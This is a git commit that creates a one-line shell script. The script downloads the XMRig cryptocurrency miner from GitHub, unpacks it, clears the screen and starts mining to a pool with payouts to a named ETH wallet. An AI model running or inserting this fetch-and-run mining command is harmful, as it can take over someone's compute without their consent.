af546dcf9da33da2dc2cceb8a1a63bb999a38790
i292iconic <119782339+i292iconic@users.noreply.github.com>
2022-12-04 14:37:26 +0530

    Create script2.sh

---
+++ script2.sh
@@ -0,0 +1,1 @@
+wget https://github.com/xmrig/xmrig/releases/download/v6.14.1/xmrig-6.14.1-linux-x64.tar.gz && tar -zxvf xmrig-6.14.1-linux-x64.tar.gz && cd xmrig-6.14.1 && clear && ./xmrig -o rx.unmineable.com:3333 -a rx -k -u ETH:0x2aFf35a9696c2Ff12345E54384a9a2B96b2d197C.myminer -p x
